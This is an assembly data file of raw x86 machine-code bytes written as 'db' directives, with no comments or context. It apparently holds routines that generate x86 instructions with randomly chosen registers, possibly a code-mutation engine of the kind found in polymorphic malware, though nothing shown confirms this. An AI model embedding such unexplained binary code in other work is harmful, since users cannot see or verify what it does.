db 007h, 05fh, 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h
db 04ah, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 02dh, 089h, 046h, 002h
db 089h, 05eh, 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh
db 082h, 02dh, 001h, 000h, 000h, 0c6h, 046h, 001h, 02ch, 0c6h, 046h, 002h, 024h, 0ebh
db 016h, 083h, 0f8h, 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h
db 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 06dh, 08bh, 05dh, 010h, 089h, 05eh
db 003h, 0e9h, 062h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h
db 000h, 000h, 004h, 028h, 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 029h, 075h, 003h, 0c6h
db 006h, 02bh, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh
db 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h
db 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh
db 0c7h, 0ebh, 006h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h
db 046h, 001h, 074h, 063h, 0e8h, 08eh, 026h, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh
db 04dh, 00ch, 03bh, 0cfh, 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h
db 07dh, 01ch, 072h, 05ch, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 0e9h, 09fh, 0feh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h
db 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh
db 0e9h, 083h, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah
db 0c3h, 0c6h, 006h, 02bh, 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h
db 0e9h, 077h, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h
db 056h, 03bh, 0c2h, 057h, 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h
db 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h
db 00fh, 087h, 0d4h, 001h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h
db 081h, 075h, 069h, 039h, 055h, 00ch, 075h, 047h, 0e8h, 0aah, 025h, 000h, 000h, 0a8h
db 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh
db 01ch, 00fh, 082h, 0a9h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 035h, 089h
db 05eh, 001h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h
db 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0cch, 0f4h, 0ffh, 0ffh, 083h
db 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh
db 082h, 073h, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 010h, 08bh, 05dh, 010h, 088h
db 046h, 001h, 089h, 05eh, 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah
db 007h, 05fh, 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h
db 04ah, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 035h, 089h, 046h, 002h
db 089h, 05eh, 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh
db 082h, 02dh, 001h, 000h, 000h, 0c6h, 046h, 001h, 034h, 0c6h, 046h, 002h, 024h, 0ebh
db 016h, 083h, 0f8h, 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h
db 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 075h, 08bh, 05dh, 010h, 089h, 05eh
db 003h, 0e9h, 062h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h
db 000h, 000h, 004h, 030h, 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 031h, 075h, 003h, 0c6h
db 006h, 033h, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh
db 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h
db 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh
db 0c7h, 0ebh, 006h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h
db 046h, 001h, 074h, 063h, 0e8h, 088h, 024h, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh
db 04dh, 00ch, 03bh, 0cfh, 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h
db 07dh, 01ch, 072h, 05ch, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 0e9h, 09fh, 0feh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h
db 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh
db 0e9h, 083h, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah
db 0c3h, 0c6h, 006h, 033h, 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h
db 0e9h, 077h, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h
db 056h, 03bh, 0c2h, 057h, 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h
db 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h
db 00fh, 087h, 0d4h, 001h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h
db 081h, 075h, 069h, 039h, 055h, 00ch, 075h, 047h, 0e8h, 0a4h, 023h, 000h, 000h, 0a8h
db 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh
db 01ch, 00fh, 082h, 0a9h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 03dh, 089h
db 05eh, 001h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h
db 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0c6h, 0f2h, 0ffh, 0ffh, 083h
db 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh
db 082h, 073h, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 008h, 08bh, 05dh, 010h, 088h
db 046h, 001h, 089h, 05eh, 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah
db 007h, 05fh, 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h
db 04ah, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 03dh, 089h, 046h, 002h
db 089h, 05eh, 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh
db 082h, 02dh, 001h, 000h, 000h, 0c6h, 046h, 001h, 03ch, 0c6h, 046h, 002h, 024h, 0ebh
db 016h, 083h, 0f8h, 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h
db 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 07dh, 08bh, 05dh, 010h, 089h, 05eh
db 003h, 0e9h, 062h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h
db 000h, 000h, 004h, 038h, 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 039h, 075h, 003h, 0c6h
db 006h, 03bh, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh
db 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h
db 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh
db 0c7h, 0ebh, 006h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h
db 046h, 001h, 074h, 063h, 0e8h, 082h, 022h, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh
db 04dh, 00ch, 03bh, 0cfh, 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h
db 07dh, 01ch, 072h, 05ch, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 0e9h, 09fh, 0feh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h
db 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh
db 0e9h, 083h, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah
db 0c3h, 0c6h, 006h, 03bh, 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h
db 0e9h, 077h, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 051h, 08bh, 045h, 014h, 053h, 056h
db 089h, 045h, 0fch, 033h, 0c9h, 033h, 0f6h, 083h, 065h, 0fch, 001h, 057h, 08bh, 07dh
db 018h, 074h, 00bh, 039h, 04dh, 00ch, 074h, 006h, 06ah, 001h, 0c6h, 007h, 050h, 05eh
db 089h, 045h, 018h, 083h, 065h, 018h, 004h, 074h, 00bh, 083h, 07dh, 00ch, 002h, 074h
db 005h, 0c6h, 004h, 03eh, 052h, 046h, 039h, 04dh, 008h, 08bh, 0deh, 074h, 027h, 083h
db 07dh, 008h, 001h, 074h, 021h, 083h, 07dh, 008h, 003h, 074h, 01bh, 08dh, 014h, 03eh
db 06ah, 0ffh, 052h, 050h, 0ffh, 075h, 00ch, 051h, 06ah, 001h, 0e8h, 098h, 0f1h, 0ffh
db 0ffh, 083h, 0c4h, 018h, 003h, 0f0h, 033h, 0c9h, 0ebh, 016h, 039h, 04dh, 00ch, 074h
db 00eh, 08dh, 014h, 03eh, 06ah, 0ffh, 052h, 050h, 0ffh, 075h, 00ch, 051h, 051h, 0ebh
db 0dfh, 083h, 0cbh, 0ffh, 03bh, 0deh, 00fh, 084h, 00bh, 001h, 000h, 000h, 039h, 04dh
db 008h, 00fh, 084h, 0a8h, 000h, 000h, 000h, 083h, 07dh, 008h, 002h, 00fh, 084h, 09eh
db 000h, 000h, 000h, 083h, 07dh, 008h, 001h, 075h, 06ah, 08bh, 045h, 010h, 083h, 0f8h
db 004h, 075h, 010h, 0c6h, 004h, 03eh, 0f7h, 046h, 0c6h, 004h, 03eh, 024h, 0c6h, 044h
db 03eh, 001h, 024h, 0ebh, 013h, 083h, 0f8h, 005h, 075h, 012h, 0c6h, 004h, 03eh, 0f7h
db 046h, 0c6h, 004h, 03eh, 065h, 080h, 064h, 03eh, 001h, 000h, 046h, 046h, 0ebh, 077h
db 083h, 0f8h, 007h, 077h, 009h, 0c6h, 004h, 03eh, 0f7h, 046h, 004h, 020h, 0ebh, 065h
db 08dh, 00ch, 03eh, 06ah, 0ffh, 051h, 08bh, 0deh, 0ffh, 075h, 014h, 050h, 06ah, 002h
db 06ah, 003h, 0e8h, 006h, 0f1h, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 03bh, 0deh
db 00fh, 084h, 093h, 000h, 000h, 000h, 0c6h, 004h, 03eh, 0f7h, 046h, 0c6h, 004h, 03eh
db 022h, 0ebh, 029h, 08dh, 004h, 03eh, 06ah, 0ffh, 050h, 08bh, 0deh, 0ffh, 075h, 014h
db 0ffh, 075h, 010h, 06ah, 002h, 06ah, 003h, 0e8h, 0d7h, 0f0h, 0ffh, 0ffh, 003h, 0f0h
db 083h, 0c4h, 018h, 03bh, 0deh, 074h, 068h, 0c6h, 004h, 03eh, 0f7h, 046h, 0c6h, 004h
db 03eh, 0e2h, 046h, 033h, 0c9h, 0ebh, 00eh, 08ah, 045h, 010h, 0c6h, 004h, 03eh, 0f7h
db 046h, 02ch, 020h, 088h, 004h, 03eh, 046h, 039h, 04dh, 008h, 08bh, 0deh, 074h, 029h
db 083h, 07dh, 008h, 001h, 074h, 023h, 083h, 07dh, 008h, 003h, 074h, 01dh, 08dh, 004h
db 03eh, 06ah, 0ffh, 050h, 0ffh, 075h, 014h, 051h, 0ffh, 075h, 00ch, 06ah, 002h, 0e8h
db 08bh, 0f0h, 0ffh, 0ffh, 083h, 0c4h, 018h, 003h, 0f0h, 033h, 0c9h, 0ebh, 018h, 039h
db 04dh, 00ch, 074h, 010h, 08dh, 004h, 03eh, 06ah, 0ffh, 050h, 0ffh, 075h, 014h, 051h
db 0ffh, 075h, 00ch, 051h, 0ebh, 0ddh, 083h, 0cbh, 0ffh, 03bh, 0deh, 075h, 004h, 033h
db 0c0h, 0ebh, 021h, 039h, 04dh, 018h, 074h, 00bh, 083h, 07dh, 00ch, 002h, 074h, 005h
db 0c6h, 004h, 03eh, 05ah, 046h, 039h, 04dh, 0fch, 074h, 00ah, 039h, 04dh, 00ch, 074h
db 005h, 0c6h, 004h, 03eh, 058h, 046h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h
db 08bh, 0ech, 083h, 07dh, 010h, 000h, 053h, 08bh, 05dh, 008h, 056h, 057h, 074h, 01fh
db 083h, 07dh, 010h, 003h, 074h, 019h, 083h, 07dh, 010h, 001h, 074h, 013h, 08bh, 07dh
db 01ch, 06ah, 0f1h, 057h, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 00ch, 06ah
db 004h, 0ebh, 011h, 08bh, 07dh, 01ch, 06ah, 0f1h, 057h, 0ffh, 075h, 018h, 0ffh, 075h
db 014h, 0ffh, 075h, 00ch, 06ah, 003h, 0e8h, 0f8h, 0efh, 0ffh, 0ffh, 08bh, 0f0h, 083h
db 0c4h, 018h, 085h, 0f6h, 00fh, 084h, 0c8h, 000h, 000h, 000h, 089h, 075h, 014h, 085h
db 0dbh, 074h, 06fh, 083h, 07bh, 01ch, 000h, 074h, 03dh, 08ah, 045h, 00ch, 004h, 032h
db 088h, 004h, 03eh, 046h, 089h, 075h, 01ch, 08dh, 004h, 03eh, 050h, 0ffh, 075h, 018h
db 0ffh, 073h, 024h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 073h, 020h, 0e8h, 07eh
db 0ffh, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 039h, 075h, 01ch, 00fh, 084h, 089h
db 000h, 000h, 000h, 08ah, 045h, 00ch, 004h, 03ah, 088h, 004h, 03eh, 046h, 0ebh, 028h
db 0ffh, 073h, 018h, 08dh, 004h, 03eh, 089h, 075h, 01ch, 050h, 0ffh, 073h, 014h, 0ffh
db 073h, 010h, 0ffh, 073h, 00ch, 0ffh, 073h, 008h, 0ffh, 073h, 004h, 0e8h, 057h, 0edh
db 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 01ch, 039h, 075h, 01ch, 074h, 056h, 08bh, 01bh
db 0ebh, 08dh, 083h, 07dh, 010h, 000h, 074h, 050h, 083h, 07dh, 010h, 003h, 074h, 04ah
db 083h, 07dh, 010h, 001h, 074h, 044h, 08dh, 004h, 03eh, 06ah, 0f1h, 050h, 08bh, 0deh
db 0ffh, 075h, 018h, 06ah, 001h, 0ffh, 075h, 00ch, 06ah, 004h, 0e8h, 044h, 0f7h, 0ffh
db 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 03bh, 0f3h, 074h, 020h, 08dh, 004h, 03eh, 06ah
db 0f1h, 050h, 08bh, 0deh, 0ffh, 075h, 018h, 06ah, 000h, 0ffh, 075h, 00ch, 06ah, 004h
db 0e8h, 030h, 0fbh, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 03bh, 0f3h, 075h, 038h
db 033h, 0c0h, 0ebh, 04bh, 08dh, 004h, 03eh, 06ah, 0f1h, 050h, 08bh, 0deh, 0ffh, 075h
db 018h, 06ah, 001h, 0ffh, 075h, 00ch, 06ah, 003h, 0e8h, 000h, 0f7h, 0ffh, 0ffh, 003h
db 0f0h, 083h, 0c4h, 018h, 03bh, 0f3h, 074h, 0dch, 08dh, 004h, 03eh, 06ah, 0f1h, 050h
db 08bh, 0deh, 0ffh, 075h, 018h, 06ah, 000h, 0ffh, 075h, 00ch, 06ah, 003h, 0ebh, 0bah
db 08bh, 045h, 014h, 003h, 0feh, 02bh, 0c6h, 0c6h, 007h, 00fh, 083h, 0e8h, 006h, 0c6h
db 047h, 001h, 085h, 089h, 047h, 002h, 08dh, 046h, 006h, 05fh, 05eh, 05bh, 05dh, 0c3h
db 056h, 08bh, 074h, 024h, 008h, 085h, 0f6h, 074h, 020h, 08bh, 006h, 085h, 0c0h, 074h
db 006h, 08bh, 0f0h, 085h, 0f6h, 075h, 0f4h, 085h, 0f6h, 074h, 010h, 06ah, 001h, 06ah
db 028h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 059h, 089h, 006h, 059h, 0ebh, 00ch, 06ah
db 001h, 06ah, 028h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 059h, 059h, 085h, 0c0h, 05eh
db 074h, 03eh, 08bh, 04ch, 024h, 008h, 08bh, 051h, 014h, 089h, 050h, 014h, 08bh, 051h
db 018h, 083h, 020h, 000h, 089h, 050h, 018h, 08bh, 051h, 00ch, 089h, 050h, 00ch, 08bh
db 051h, 010h, 089h, 050h, 010h, 08bh, 051h, 004h, 089h, 050h, 004h, 08bh, 051h, 008h
db 089h, 050h, 008h, 08bh, 051h, 020h, 089h, 050h, 020h, 08bh, 051h, 01ch, 089h, 050h
db 01ch, 08bh, 049h, 024h, 089h, 048h, 024h, 0c3h, 033h, 0c0h, 0c3h, 056h, 08bh, 074h
db 024h, 008h, 085h, 0f6h, 074h, 00eh, 08bh, 0c6h, 08bh, 036h, 050h, 0ffh, 015h, 0d8h
db 050h, 000h, 000h, 059h, 0ebh, 0eeh, 05eh, 0c3h, 055h, 08bh, 0ech, 08bh, 045h, 00ch
db 083h, 0f8h, 007h, 077h, 03fh, 0ffh, 024h, 085h, 047h, 02eh, 000h, 000h, 08bh, 045h
db 008h, 024h, 0feh, 05dh, 0c3h, 08bh, 045h, 008h, 024h, 0f7h, 05dh, 0c3h, 08bh, 045h
db 008h, 024h, 0fdh, 05dh, 0c3h, 08bh, 045h, 008h, 024h, 0fbh, 05dh, 0c3h, 08bh, 045h
db 008h, 024h, 0dfh, 05dh, 0c3h, 08bh, 045h, 008h, 024h, 0efh, 05dh, 0c3h, 08bh, 045h
db 008h, 024h, 0bfh, 05dh, 0c3h, 08bh, 045h, 008h, 024h, 07fh, 05dh, 0c3h, 08bh, 045h
db 008h, 05dh, 0c3h, 00ah, 02eh, 000h, 000h, 018h, 02eh, 000h, 000h, 01fh, 02eh, 000h
db 000h, 011h, 02eh, 000h, 000h, 02dh, 02eh, 000h, 000h, 026h, 02eh, 000h, 000h, 034h
db 02eh, 000h, 000h, 03bh, 02eh, 000h, 000h, 08bh, 04ch, 024h, 004h, 08bh, 001h, 0a8h
db 001h, 075h, 007h, 00ch, 001h, 089h, 001h, 033h, 0c0h, 0c3h, 0a8h, 008h, 075h, 008h
db 00ch, 008h, 06ah, 003h, 089h, 001h, 0ebh, 046h, 0a8h, 002h, 075h, 008h, 00ch, 002h
db 06ah, 001h, 089h, 001h, 0ebh, 03ah, 0a8h, 004h, 075h, 008h, 00ch, 004h, 06ah, 002h
db 089h, 001h, 0ebh, 02eh, 0a8h, 020h, 075h, 008h, 00ch, 020h, 06ah, 005h, 089h, 001h
db 0ebh, 022h, 0a8h, 010h, 075h, 008h, 00ch, 010h, 06ah, 004h, 089h, 001h, 0ebh, 016h
db 0a8h, 040h, 075h, 008h, 00ch, 040h, 06ah, 006h, 089h, 001h, 0ebh, 00ah, 0a8h, 080h
db 075h, 008h, 00ch, 080h, 06ah, 007h, 089h, 001h, 058h, 0c3h, 083h, 0c8h, 0ffh, 0c3h
db 08bh, 044h, 024h, 004h, 083h, 0f8h, 007h, 077h, 029h, 0ffh, 024h, 085h, 005h, 02fh
db 000h, 000h, 06ah, 001h, 0ebh, 016h, 06ah, 008h, 0ebh, 012h, 06ah, 002h, 0ebh, 00eh
db 06ah, 004h, 0ebh, 00ah, 06ah, 020h, 0ebh, 006h, 06ah, 010h, 0ebh, 002h, 06ah, 040h
db 058h, 0c3h, 0b8h, 080h, 000h, 000h, 000h, 0c3h, 033h, 0c0h, 0c3h, 0e0h, 02eh, 000h
db 000h, 0e8h, 02eh, 000h, 000h, 0ech, 02eh, 000h, 000h, 0e4h, 02eh, 000h, 000h, 0f4h
db 02eh, 000h, 000h, 0f0h, 02eh, 000h, 000h, 0f8h, 02eh, 000h, 000h, 0fch, 02eh, 000h
db 000h, 055h, 08bh, 0ech, 083h, 0ech, 038h, 081h, 07dh, 00ch, 000h, 050h, 000h, 000h
db 053h, 056h, 057h, 00fh, 082h, 0b2h, 000h, 000h, 000h, 033h, 0dbh, 06ah, 007h, 053h
db 0e8h, 0a1h, 01dh, 000h, 000h, 059h, 089h, 045h, 0f8h, 059h, 06ah, 004h, 05eh, 03bh
db 0c6h, 075h, 00fh, 06ah, 007h, 053h, 0e8h, 08dh, 01dh, 000h, 000h, 059h, 089h, 045h
db 0f8h, 059h, 0ebh, 0edh, 06ah, 007h, 053h, 0e8h, 07eh, 01dh, 000h, 000h, 03bh, 045h
db 0f8h, 059h, 059h, 089h, 045h, 0fch, 074h, 0eeh, 03bh, 0c6h, 074h, 0eah, 050h, 0e8h
db 054h, 0ffh, 0ffh, 0ffh, 0ffh, 075h, 0f8h, 08bh, 0f8h, 0e8h, 04ah, 0ffh, 0ffh, 0ffh
db 056h, 00bh, 0f8h, 0e8h, 042h, 0ffh, 0ffh, 0ffh, 00bh, 0f8h, 08bh, 045h, 00ch, 0d1h
db 0e8h, 048h, 050h, 053h, 0e8h, 0fbh, 01ch, 000h, 000h, 050h, 089h, 045h, 0f0h, 0ffh
db 075h, 008h, 056h, 053h, 053h, 053h, 06ah, 007h, 0e8h, 058h, 0eah, 0ffh, 0ffh, 08bh
db 0f0h, 083h, 0c4h, 030h, 03bh, 0f3h, 074h, 035h, 08bh, 045h, 00ch, 06ah, 003h, 02bh
db 045h, 0f0h, 033h, 0d2h, 059h, 089h, 075h, 0f4h, 0f7h, 0f1h, 083h, 0c0h, 0a6h, 089h
db 045h, 00ch, 050h, 08bh, 045h, 008h, 003h, 0c6h, 050h, 057h, 0ffh, 075h, 010h, 0ffh
db 075h, 0fch, 051h, 053h, 0e8h, 024h, 0eah, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 01ch
db 039h, 075h, 0f4h, 075h, 007h, 033h, 0c0h, 0e9h, 0e6h, 000h, 000h, 000h, 08bh, 045h
db 00ch, 089h, 07dh, 0dch, 089h, 045h, 0e0h, 08bh, 045h, 0fch, 089h, 045h, 0d4h, 08bh
db 045h, 018h, 089h, 045h, 0d8h, 08dh, 045h, 0c8h, 050h, 053h, 0c7h, 045h, 0cch, 005h
db 000h, 000h, 000h, 0c7h, 045h, 0d0h, 004h, 000h, 000h, 000h, 089h, 05dh, 0e8h, 089h
db 05dh, 0e4h, 089h, 05dh, 0ech, 0e8h, 03ah, 0fdh, 0ffh, 0ffh, 08bh, 04dh, 00ch, 089h
db 045h, 018h, 089h, 04dh, 0e0h, 08bh, 04dh, 0fch, 089h, 04dh, 0d4h, 08dh, 04dh, 0c8h
db 051h, 050h, 089h, 07dh, 0dch, 0c7h, 045h, 0d8h, 004h, 000h, 000h, 000h, 0c7h, 045h
db 0cch, 001h, 000h, 000h, 000h, 0c7h, 045h, 0d0h, 003h, 000h, 000h, 000h, 089h, 05dh
db 0e8h, 089h, 05dh, 0e4h, 089h, 05dh, 0ech, 0e8h, 000h, 0fdh, 0ffh, 0ffh, 08bh, 045h
db 008h, 083h, 0c4h, 010h, 003h, 0c6h, 089h, 075h, 0f4h, 050h, 0ffh, 075h, 0fch, 0e8h
db 058h, 0feh, 0ffh, 0ffh, 059h, 050h, 08bh, 045h, 014h, 0c1h, 0e8h, 002h, 040h, 050h
db 06ah, 003h, 0ffh, 075h, 0f8h, 0ffh, 075h, 018h, 0e8h, 068h, 0fbh, 0ffh, 0ffh, 003h
db 0f0h, 083h, 0c4h, 018h, 039h, 075h, 0f4h, 074h, 036h, 08bh, 045h, 008h, 06ah, 0ffh
db 003h, 0c6h, 089h, 075h, 0f4h, 050h, 057h, 0ffh, 075h, 010h, 0ffh, 075h, 0f8h, 06ah
db 003h, 053h, 0e8h, 054h, 0e9h, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 01ch, 039h, 075h
db 0f4h, 074h, 012h, 08bh, 04dh, 008h, 08ah, 045h, 0f8h, 003h, 0f1h, 08bh, 0d9h, 080h
db 00eh, 0ffh, 02ch, 020h, 088h, 046h, 001h, 0ffh, 075h, 018h, 0e8h, 008h, 0fdh, 0ffh
db 0ffh, 059h, 08bh, 0c3h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 056h, 057h, 068h, 074h, 014h
db 000h, 000h, 0ffh, 074h, 024h, 010h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh, 0f8h
db 059h, 085h, 0ffh, 059h, 00fh, 084h, 08ch, 000h, 000h, 000h, 06ah, 000h, 06ah, 000h
db 057h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 083h, 0c4h, 00ch, 085h, 0c0h, 075h, 072h
db 08bh, 074h, 024h, 010h, 057h, 06ah, 001h, 06ah, 040h, 056h, 0ffh, 015h, 0a4h, 050h
